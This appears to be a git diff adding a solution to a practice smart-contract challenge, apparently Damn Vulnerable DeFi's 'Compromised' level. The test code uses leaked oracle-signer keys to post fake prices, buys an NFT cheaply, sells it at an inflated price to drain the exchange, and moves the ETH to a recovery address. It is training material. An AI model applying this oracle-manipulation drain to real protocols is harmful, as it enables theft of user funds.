@@ -75,7 +75,47 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // since we have their private keys (leaked from the web request) we can simulate transactions with their addresses
+        address trustedSourceAddressOne = 0x188Ea627E3531Db590e6f1D71ED83628d1933088;
+        address trustedSourceAddressTwo = 0xA417D473c40a4d42BAd35f147c21eEa7973539D8;
         
+        // drop initial price
+        vm.prank(trustedSourceAddressOne);
+        oracle.postPrice("DVNFT", 0.1 ether);
+
+        vm.prank(trustedSourceAddressTwo);
+        oracle.postPrice("DVNFT", 0.1 ether);
+
+        // buy an nft
+        vm.prank(player);
+        exchange.buyOne{value: 0.1 ether}();
+
+        // approve exchange to receive the nft when selling it
+        vm.prank(player);
+        nft.approve(address(exchange), 0);
+
+        // set selling price to drain exchange
+        vm.prank(trustedSourceAddressOne);
+        oracle.postPrice("DVNFT", 999.1 ether);
+
+        vm.prank(trustedSourceAddressTwo);
+        oracle.postPrice("DVNFT", 999.1 ether);
+
+        // sell the nft
+        vm.prank(player);
+        exchange.sellOne(0);
+
+        // restore the old prices
+        vm.prank(trustedSourceAddressOne);
+        oracle.postPrice("DVNFT", 999 ether);
+
+        vm.prank(trustedSourceAddressTwo);
+        oracle.postPrice("DVNFT", 999 ether);
+
+        // send ETH into recovery address
+        vm.prank(player);
+        (bool success, ) = payable(recovery).call{value: 999 ether}("");
+        require(success, "Transfer failed");
     }
 
     /**
